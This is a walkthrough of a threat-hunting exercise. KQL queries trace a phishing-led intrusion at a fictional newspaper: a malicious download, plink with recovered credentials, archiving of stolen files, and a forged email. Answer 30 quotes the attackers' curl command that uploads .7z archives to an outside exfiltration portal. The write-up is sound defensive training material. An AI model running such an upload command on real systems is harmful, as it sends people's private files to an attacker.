---
icon: '4'
---

# A Scandal

1. **How many total emails were sent by this email sender to users at The Valdorian Times?**

Ans 18

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

```kusto
// KQL

Email
| where sender  == "valdorias_best_recruiter@gmail.com"
|summarize count()
```

2. When did valdorias\_best\_recruiter@gmail.com send an email to Ronnie McLovin?\*

Ans

&#x20;![](<../.gitbook/assets/image (18).png>)

```kusto
// KQL

Email
| where sender == "valdorias_best_recruiter@gmail.com"
| where recipient has "ronnie"
| project timestamp, subject
```

3. **What domain was in the link from that email?**

Ans : just update previous KQL with link&#x20;

<figure><img src="../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>

```kusto
// KQL

Email
| where sender == "valdorias_best_recruiter@gmail.com"
| where recipient has "ronnie"
| project  link
```

4. What was the subject of that email?

Ans  ✅ \[EXTERNAL] Breaking News: We're Hiring! Apply Now for Reporter Roles

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

```kusto
// KQL

Email
| where sender == "valdorias_best_recruiter@gmail.com"
| where recipient has "ronnie"
| project  subject
```

5. **When did Ronnie click on the link in the email from `valdorias_best_recruiter@gmail.com` ?**

Ans  for this we need to check source ip viz is ip of Rommie and outbound n/w events since on click link will send packet via n/w&#x20;

<figure><img src="../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

```kusto
// KQL

Employees
| where name has "Ronnie"
| project ip_addr

 // it will show ip as 10.10.0.19
 // Now write KQL to find timestamp 
 
 
OutboundNetworkEvents
| where url contains "promotionrecruit.org"
| where src_ip == "10.10.0.19"
| project timestamp
```

6. What was the name of the .docx file that was downloaded to Ronnie's machine?

Ans  Let's find out the Ronnie machine name&#x20;

```kusto
Employees
| where name == "Ronnie McLovin"
| project hostname
```

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

Now write KQL to find docx&#x20;

<figure><img src="../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>

```kusto
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename endswith ".docx"
|project filename
```

7. When was this docx file downloaded?

Ans: Just add timestamp and project it.&#x20;

````kusto
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename endswith ".docx"
|project filename, timestamp

```Ans 
2024-01-10T08:55:17Z
```
````

<figure><img src="../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>

8. When was the .ps1 file dropped to Ronnie's machine?

Ans&#x20;

```kusto
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "hacktivist_manifesto.ps1"
| project timestamp, filename
```

<figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

9. **What IP address was used with plink on Ronnie's machine?**

**Ans**&#x20;

```kusto

ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has "plink.exe"
| project process_commandline

Ans 
✅ 168.57.191.100
```

<figure><img src="../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>

10. **What username was used with plink on Ronnie's machine?**

**Ans**  In the previous command, we can find after ssh -l&#x20;

$had0w

11. What password was used with plink on Ronnie's machine?

Ans  same from the previous command&#x20;

```json
thruthW!llS3tUfree
```

12. How many discovery commands were run on Ronnie's machine?

Ans  5

```kusto
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has_any ("whoami", "hostname", "ipconfig", "netstat", "systeminfo", "tasklist", "net user", "net view", "net localgroup", "arp", "route", "nbtstat")
| summarize count()
```

<figure><img src="../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

13. Your investigative buddy, who was also looking at Ronnie's machine, saw a weird file fakestory.docx being downloaded from a suspicious domain.

    Let's see if we can find evidence of this download in OutboundNetworkEvents.

    What is Ronnie's IP address?

Ans  This question is simply lengthy, just run simple employees query to find details&#x20;

```json
10.10.0.19
```

```kusto
Employees
| where name == "Ronnie McLovin"
| project ip_addr
```

<figure><img src="../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

14. What is the full URL fakestory.docx was downloaded from?

Ans we already have Ronnie IP's address from previous query now we can run kql to find url using outbound network

```kusto
OutboundNetworkEvents
| where src_ip == "10.10.0.19"
| where url contains "fakestory.docx"
| project timestamp, url


```

```json
https://hire-recruit.org/files/fakescandal/2024/fakestory.docx
```

<figure><img src="../.gitbook/assets/image (30).png" alt=""><figcaption></figcaption></figure>

15. It does look like someone downloaded fakestory.docx to Ronnie's machine. Let's see if we can find that file on disk.

    What is Ronnie's hostname?

Ans **A37A-DESKTOP** in previous command we already had hostname&#x20;

16. What is the sha256 hash of fakestory.docx on Ronnie's machine?

Ans:&#x20;

```kusto
FileCreationEvents
| where hostname == "A37A-DESKTOP"
| where filename == "fakestory.docx"
| project timestamp, filename, sha256
```

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

17. When was fakestory.docx created on Ronnie's machine?

Ans:  from previous command we can have timestamp

✅ 2024-01-31T09:47:51Z

18. Ronnie doesn't recall ever seeing that file or visiting that domain. It seems that this file download is evidence of hands-on-keyboard activity from the attackers.

    Let's see what the attackers did after they downloaded fakestory.docx by looking at ProcessEvents for Ronnie's machine.

    After downloading fakestory.docx, the attackers ran a command to rename and move the file to a different location.

    What is the new path for the document?

Ans:  ✅ C:\Users\romclovin\Documents\OpEdFinal\_to\_print.docx

```kusto
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has "fakestory.docx"
| where process_commandline has_any ("rename", "move")
| project timestamp, process_commandline
```

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

19. When was this command executed to rename and move the file?

Ans:  2024-01-31T10:26:20Z

20. OpEdFinal… that seems familiar.

    Wait a minute, that's the same file name you saw when you looked in the email logs to find Ronnie sending the draft to Clark Kent. Is it possible that the attacker used Ronnie's email to send this file to Clark?

    When was OpEdFinal\_to\_print.docx emailed from Ronnie's account to Clark Kent?

Ans:  ✅ 2024-01-31T11:11:12Z

```kusto
Email
| where sender == "ronnie_mclovin@valdoriantimes.news"
| where recipient == "clark_kent@valdoriantimes.news"
| project timestamp, subject
```

<figure><img src="../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

21. How many minutes elapsed between when the file was moved/renamed on Ronnie machine and when the email was sent to Clark Kent?

Ans: let's write a complex KQL query&#x20;

```json
44.866666666666667
```

```kusto
let move_time = toscalar(
    ProcessEvents
    | where hostname == "A37A-DESKTOP"
    | where process_commandline has "OpEdFinal_to_print.docx"
    | where process_commandline has_any ("rename", "move")
    | project timestamp
);
let email_time = toscalar(
    Email
    | where sender == "ronnie_mclovin@valdoriantimes.news"
    | where recipient == "clark_kent@valdoriantimes.news"
    | project timestamp
);
print elapsed_minutes = datetime_diff('second', email_time, move_time) / 60.0
```

1. **Find the timestamp when the file was moved/renamed:**

kql

```kusto
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline has "OpEdFinal_to_print.docx"
| where process_commandline has_any ("rename", "move")
| project timestamp, process_commandline
```

2. **Find the timestamp when the email was sent:**

kql

```kusto
Email
| where sender == "ronnie_mclovin@valdoriantimes.news"
| where recipient == "clark_kent@valdoriantimes.news"
| where subject contains "OpEdFinal_to_print.docx"
| project timestamp, subject
```

<figure><img src="../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

22. What was the subject line of this email?

Ans: from previous command&#x20;

✅ URGENT: Final OpEd Draft Edits (Please publish the following article in tomorrow's paper))

23. Wow! So it looks like the attackers downloaded the fake story, renamed it OpEdFinal\_to\_print.docx, and then sent the file to Clark Kent using Ronnie's email!

    Do you think this is the only thing the attackers did on Ronnie's machine? (yes/n

Ans: No&#x20;

24. In the middle of your investigation, Ronnie finds you and shows you an alert she received from her dark web monitoring service. What is the domain mentioned in this alert?

Ans:  ✅ hirerecruit.com

25. Oh no! It looks like someone may have stolen Ronnie's memes from her machine! Let's see if we can find evidence of the attackers stealing any data.

    We can timebound our analysis to find other actions that occurred around the same time by using this query:

```kusto
// Some code

ProcessEvents
| where timestamp between (datetime(2024-01-21 07:00:00) .. datetime(2024-01-21 12:00:00))
| where hostname == "A37A-DESKTOP"
| order by timestamp asc
| summarize count()

```

Ans 2&#x20;

26. Right after renaming fakestory.docx to OpEdFinal\_to\_print.docx, the attackers ran commands to steal (exfiltrate) data from Ronnie's machine.

    One command the attackers ran leveraged 7zip to compress all of Ronnie's dank memes into a .7z file. What is the name of the .7z file that contains the stolen memes?

Ans: DankMemes.7z

```kusto

ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "7z"
| project process_commandline
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

27. What is the name of the .7z file that contains files stolen from Ronnie's Documents folder?

Ans: Look for the MystolenData folder&#x20;

✅ MyStolenDataFromDocuments.7z

```kusto
ProcessEvents
| where hostname == "A37A-DESKTOP"
| where process_commandline contains "7z"
| project process_commandline
```

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

28. What is the name of the .7z file that contains files stolen from Ronnie's Desktop folder?

Ans: ✅ MyStolenDataFromDesktop.7z

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

29. What is the password the attackers used to encrypt all of the .7z files?

Ans: ✅ thruthW!llS3tUfree

30. After compressing all the stolen data into .7z files, the attackers exfiltrated the data by uploading it to a custom portal on their website.

    What is the full command the attackers ran to do this

Ans:  ✅ curl -F "file=@C:\Users\romclovin\Documents\*.7z" https://hirejob.com/exfil\_processor/upload.php

31. What domain was the stolen data uploaded to?

Ans:  ✅ hirejob.com

32. Query ProcessEvents for all devices at Valdorian Times.

    Was data stolen from any other devices and uploaded to hirejob.com? (yes/no)

Ans:  no , since there is no other system than "A37A-DESKTOP"&#x20;

```kusto
ProcessEvents
| where process_commandline has "hirejob.com"
| sort by  hostname 
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

33.
